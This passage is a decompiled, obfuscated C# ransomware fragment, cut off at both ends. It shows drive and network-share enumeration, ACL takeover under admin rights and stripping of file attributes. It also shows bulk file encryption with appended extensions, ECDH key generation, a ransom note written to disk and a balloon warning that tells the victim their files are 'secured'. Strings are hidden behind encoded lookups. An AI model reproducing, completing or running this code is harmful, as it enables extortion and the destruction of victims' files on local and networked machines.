			if (registryKey != null)
			{
				registryKey.SetValue(jPRGqhYdKzNWs(getString_0(107387777)), jPRGqhYdKzNWs(QjfFJDLGisgV));
				registryKey.SetValue(jPRGqhYdKzNWs(getString_0(107387232)), jPRGqhYdKzNWs(yoTLWcBbMwO));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void YSpeqxPvcWIk()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (xYpLCAVgyBOj == getString_0(107396821) && !string.IsNullOrEmpty(UlVSLsCncbMdhGO) && !string.IsNullOrEmpty(uvZdOBpqtfGE))
				{
					CqOQtQEeESwT(getString_0(107389504), UlVSLsCncbMdhGO, uvZdOBpqtfGE);
				}
				else
				{
					CqOQtQEeESwT(getString_0(107389504), getString_0(107389329), getString_0(107388788));
				}
			}
		}
		catch
		{
		}
	}

	public static void GgXCxjftqowaPI(string iIbLHjiekdJN = "SW5mb3JtYXRpb24uLi4=", string ZiArdjldSgtQ = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(jPRGqhYdKzNWs(iIbLHjiekdJN));
		val.set_BalloonTipText(jPRGqhYdKzNWs(ZiArdjldSgtQ));
		val.ShowBalloonTip(30000);
	}

	public static void lcBfXvrKPqbkd(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107387203)), getString_0(107387218) + text + getString_0(107387177) + string_0);
	}

	public static void DjPMEMdbQtZKb(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = jPRGqhYdKzNWs(getString_0(107387172));
		processStartInfo.Arguments = getString_0(107387143) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool ovhYHjFmAq(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool uftPrarziOKRnZEr(string string_0)
	{
		try
		{
			oaYjaKaLoddVokp CS_0024_003C_003E8__locals0 = new oaYjaKaLoddVokp();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.HOXtxRZFdpFkl = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.HOXtxRZFdpFkl);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107387138);
		}
		catch
		{
			return false;
		}
	}

	public static void PmedSpBSzBvBRlc(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] array = null;
			array = (WcDXYQEnYXB ? Encoding.ASCII.GetBytes(jPRGqhYdKzNWs(getString_0(107387104))) : Encoding.ASCII.GetBytes(jPRGqhYdKzNWs(getString_0(107387161))));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string bGUnAFijntPmh(string oDSFXSRkjn, int JMMRmvysJAQCbD = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(JMMRmvysJAQCbD);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(oDSFXSRkjn, 1, intPtr, ref JMMRmvysJAQCbD) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string pJTXJoaZiy(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static byte[] EjwjUVUQBQfB(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	public static void PLwArgCGtmsJ()
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Create(CngAlgorithm.ECDiffieHellmanP521, null, new CngKeyCreationParameters
		{
			ExportPolicy = CngExportPolicies.AllowPlaintextExport
		}));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		odSXvXhnBEMCo = eCDiffieHellmanCng.Key.Export(CngKeyBlobFormat.EccPrivateBlob);
		vkIdOMxYDQuiM = eCDiffieHellmanCng.PublicKey.ToByteArray();
	}

	public static byte[] TSLNmyZpJvFY(byte[] byte_0, byte[] byte_1)
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Import(byte_0, CngKeyBlobFormat.EccPrivateBlob));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		return eCDiffieHellmanCng.DeriveKeyMaterial(CngKey.Import(byte_1, CngKeyBlobFormat.EccPublicBlob));
	}

	public static void MXWEDjfPHhhXM()
	{
		cjBpjYTVdPckNjuX(getString_0(107396479), jPRGqhYdKzNWs(getString_0(107387079)));
		string text = jPRGqhYdKzNWs(getString_0(107387397));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107387560) + text + getString_0(107387560) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396479);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void HoylbjiqYR(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387332) + string_0 + getString_0(107387323) + ex.Message + getString_0(107395716));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string hhcgraCrPsmCioL()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389504);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386722);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107387289))) ? getString_0(107386727) : getString_0(107387280));
				break;
			case 0:
				text = getString_0(107387262);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386717);
				break;
			case 4:
				text = getString_0(107386736);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389018) : getString_0(107386695));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386699) : getString_0(107386704)) : getString_0(107386709)) : getString_0(107386686));
				break;
			case 10:
				text = getString_0(107386662);
				break;
			}
		}
		if (text != getString_0(107389504))
		{
			text = getString_0(107386657) + text;
			if (oSVersion.ServicePack != getString_0(107389504))
			{
				text = text + getString_0(107387177) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string kEOHrqcKUMkw(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107394891);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107394826)));
				streamWriter.WriteLine(getString_0(107395716));
				streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107390072)));
				streamWriter.WriteLine(string_0);
				if (mVHEjGEVbs)
				{
					streamWriter.WriteLine(getString_0(107395716));
					streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107389978)));
					streamWriter.WriteLine(tHlEcNRvGaVVN.IYTCsYJsmzxE());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !ldSVapxVzrqD)
				{
					File.AppendAllText(text, getString_0(107389945) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(CJWDXdtMlfSYp, getString_0(107386676) + ex.Message + getString_0(107395716));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void lKIMFujwcgc(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		HykHslIzmdKZ.sPVQoTuZMci CS_0024_003C_003E8__locals0 = new HykHslIzmdKZ();
		CS_0024_003C_003E8__locals0.glMvqygTgUhb = string_1;
		CS_0024_003C_003E8__locals0.JffjCWlmlrkAOw = string_2;
		CS_0024_003C_003E8__locals0.WemmvPavSpAyEt = string_3;
		CS_0024_003C_003E8__locals0.BcCdGjAQGzfmNTOF = string_4;
		if (yKfQtEFbRGh && !hhcgraCrPsmCioL().Contains(getString_0(107389018)) && !hhcgraCrPsmCioL().Contains(getString_0(107386587)))
		{
			jAIgmdCIVeU.UbqAVqnvTVFqoOFn();
		}
		QbfcPqWZFoPC = Convert.FromBase64String(CS_0024_003C_003E8__locals0.WemmvPavSpAyEt);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395998))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = bGUnAFijntPmh(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !RREAXVcGCyFW.Contains(text))
							{
								RREAXVcGCyFW.Add(text);
							}
							else if (!RREAXVcGCyFW.Contains(array[i].Name))
							{
								RREAXVcGCyFW.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!RREAXVcGCyFW.Contains(array[i].Name))
							{
								RREAXVcGCyFW.Add(array[i].Name);
							}
						}
					}
					else if (!RREAXVcGCyFW.Contains(array[i].Name))
					{
						RREAXVcGCyFW.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!RREAXVcGCyFW.Contains(string_0[i]))
				{
					RREAXVcGCyFW.Add(string_0[i]);
				}
			}
		}
		if (RREAXVcGCyFW.Contains(jPRGqhYdKzNWs(getString_0(107386606))) && fgVaHjGsjcVVT == getString_0(107396821))
		{
			RREAXVcGCyFW.Remove(jPRGqhYdKzNWs(getString_0(107386606)));
		}
		Parallel.ForEach(RREAXVcGCyFW, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HykHslIzmdKZ.sPVQoTuZMci();
			CS_0024_003C_003E8__locals0.SbDXswzrOAQ = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV = string_0;
			if (AfVRFSOzqdcuiaP && !hhcgraCrPsmCioL().Contains(HykHslIzmdKZ.getString_0(107389028)) && !hhcgraCrPsmCioL().Contains(HykHslIzmdKZ.getString_0(107386597)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ovhYHjFmAq(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (xkNXdReJgqdr == HykHslIzmdKZ.getString_0(107396831))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					dPlSeQmOkALFpI(CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.glMvqygTgUhb, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.BcCdGjAQGzfmNTOF, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.JffjCWlmlrkAOw, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.WemmvPavSpAyEt);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				dPlSeQmOkALFpI(CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV, CS_0024_003C_003E8__locals0.glMvqygTgUhb, CS_0024_003C_003E8__locals0.BcCdGjAQGzfmNTOF, CS_0024_003C_003E8__locals0.JffjCWlmlrkAOw, CS_0024_003C_003E8__locals0.WemmvPavSpAyEt);
			}
		});
	}

	public static void dPlSeQmOkALFpI(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389504));
		List<string> list3 = list2;
		if (uVMjIBAQKTtmEg == getString_0(107396620))
		{
			if (tlbyuCUJmYbILB == getString_0(107396821) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && uftPrarziOKRnZEr(string_0))
			{
				TGhvwhXCaTkEMBM tGhvwhXCaTkEMBM = null;
				try
				{
					tGhvwhXCaTkEMBM = new TGhvwhXCaTkEMBM(string_0.Replace(getString_0(107397191), getString_0(107389504)));
				}
				catch
				{
					list = zLmccystKPjm(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					wmICIWLtusd(tGhvwhXCaTkEMBM.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = zLmccystKPjm(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = zLmccystKPjm(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = DjVwlfeBamsiYSvc.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0495;
					}
				}
				if ((eVxuVysgKWK == getString_0(107396620) && !item.EndsWith(text)) || rIFldVBsKLex.Contains(item))
				{
					continue;
				}
				if (KBtpeelEiWZuxq == getString_0(107396821))
				{
					try
					{
						if (LQFJNYySgreoXH.ZXqazdzrWuEoK(item))
						{
							LQFJNYySgreoXH.JDPsRwBlMXAQgL(item);
						}
					}
					catch
					{
					}
				}
				rIFldVBsKLex.Add(item);
				if (!tCYvoiODTAqS.Contains(Path.GetDirectoryName(item)))
				{
					tCYvoiODTAqS.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (tRxOjxLQIVi == getString_0(107396821) && fileStream.Length > Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024 && !list3.Contains(text))
					{
						if (hCeAnCNkuBouGp == getString_0(107396821))
						{
							foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
							{
								if (item.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396821))
								{
									if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396620))
								{
									try
									{
										tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = ILCPTbEyPImvS.hUdUxAsVxYJrsJYB(item, Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024);
						byte[] opGohBOiRlt = ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						ILCPTbEyPImvS.trQfhmTmPgoc(item, opGohBOiRlt);
						if (string_2 != getString_0(107386565))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386565))
					{
						siBOcydppb(item, item + string_2, QbfcPqWZFoPC);
					}
					else
					{
						siBOcydppb(item, item + getString_0(107386560), QbfcPqWZFoPC);
					}
				}
				catch (Exception)
				{
				}
				IL_0495:;
			}
		}
	}

	public static void wmICIWLtusd(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		UMXNmMotuFVr.IotoyMkpqvvqDZe CS_0024_003C_003E8__locals0 = new UMXNmMotuFVr();
		CS_0024_003C_003E8__locals0.MRBsiJVrGpV = list_0;
		CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs = string_1;
		CS_0024_003C_003E8__locals0.rzGfvbLcdyGbE = string_2;
		CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN = string_3;
		CS_0024_003C_003E8__locals0.wmSlFLUQMYk = new List<string> { getString_0(107389504) };
		if (eVxuVysgKWK == getString_0(107396620))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.MRBsiJVrGpV.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					UMXNmMotuFVr.hliwGyoemnnVs CS_0024_003C_003E8__locals1 = new UMXNmMotuFVr.hliwGyoemnnVs();
					CS_0024_003C_003E8__locals1.hdfjPBCWXrpm = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx = enumerator2.Current;
					if (((!CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388868)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388843)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388298)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388249)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388268)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388211)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388222)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388177)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388196)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388159)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388118)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388133)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388107)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388054))) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107388061)))) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388500)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388515)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388466)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388481)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388432)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388447)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388398)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388413)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388368)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107388347)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388334)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388353)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388304)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(UMXNmMotuFVr.getString_0(107388319)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107387758))) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387733)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387752)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107396287)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387707)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387714)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387709)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387672)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(UMXNmMotuFVr.getString_0(107387667)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(UMXNmMotuFVr.getString_0(107387662)) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(yVwPEJFmibAZK) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(CJWDXdtMlfSYp) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(VLIXjNPLrckApD))
					{
						if (CS_0024_003C_003E8__locals0.rzGfvbLcdyGbE.Length != 0)
						{
							string[] rzGfvbLcdyGbE2 = CS_0024_003C_003E8__locals0.rzGfvbLcdyGbE;
							int num2 = 0;
							while (num2 < rzGfvbLcdyGbE2.Length)
							{
								string value2 = rzGfvbLcdyGbE2[num2];
								if (!CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_10d8;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs))
							{
								goto IL_10d8;
							}
						}
						catch (Exception)
						{
							goto IL_10d8;
						}
						if (CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(string_0) && !rIFldVBsKLex.Contains(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx))
						{
							if (KBtpeelEiWZuxq == UMXNmMotuFVr.getString_0(107396839))
							{
								try
								{
									if (LQFJNYySgreoXH.ZXqazdzrWuEoK(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx))
									{
										LQFJNYySgreoXH.JDPsRwBlMXAQgL(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
									}
								}
								catch
								{
								}
							}
							rIFldVBsKLex.Add(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (oGWxQvtPLxTata)
									{
										Console.WriteLine(UMXNmMotuFVr.hliwGyoemnnVs.getString_0(107412254) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.hliwGyoemnnVs.getString_0(107412663) + new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length + UMXNmMotuFVr.hliwGyoemnnVs.getString_0(107412674));
										Console.WriteLine(UMXNmMotuFVr.hliwGyoemnnVs.getString_0(107412261), rIFldVBsKLex.Count, AOxElPxfgdJ, jlTbuRFtzeuGOi);
										Console.WriteLine(UMXNmMotuFVr.hliwGyoemnnVs.getString_0(107412204), pgcRoGyexW.Elapsed);
										Console.WriteLine(UMXNmMotuFVr.hliwGyoemnnVs.getString_0(107412633));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!tCYvoiODTAqS.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx)))
							{
								tCYvoiODTAqS.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx));
							}
							HoylbjiqYR(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
							try
							{
								new RJcskyZFMlSio().FmxkExlpiaLUbQn(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (oGWxQvtPLxTata)
										{
											Console.WriteLine(UMXNmMotuFVr.getString_0(107412737) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107412660) + new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length + UMXNmMotuFVr.getString_0(107412671));
											Console.WriteLine(UMXNmMotuFVr.getString_0(107412630));
										}
									}
									catch
									{
									}
									cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107413037)), UMXNmMotuFVr.getString_0(107387578) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107387578) + jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107413012)) + UMXNmMotuFVr.getString_0(107387578) + Environment.UserName + UMXNmMotuFVr.getString_0(107387578) + jPRGqhYdKzNWs(UMXNmMotuFVr.getString_0(107413027)));
								}
							}
							catch (Exception ex14)
							{
								if (iJiZVjbYIelgdjs)
								{
									try
									{
										File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107413002) + ex14.Message + UMXNmMotuFVr.getString_0(107395734));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length != 0L)
									{
										goto end_IL_08d2;
									}
									goto end_IL_08d1;
									end_IL_08d2:;
								}
								catch (Exception ex14)
								{
									if (iJiZVjbYIelgdjs)
									{
										try
										{
											File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107412889) + ex14.Message + UMXNmMotuFVr.getString_0(107395734));
										}
										catch (Exception)
										{
										}
									}
									jlTbuRFtzeuGOi++;
									goto end_IL_08d1;
								}
								byte[] bytes2;
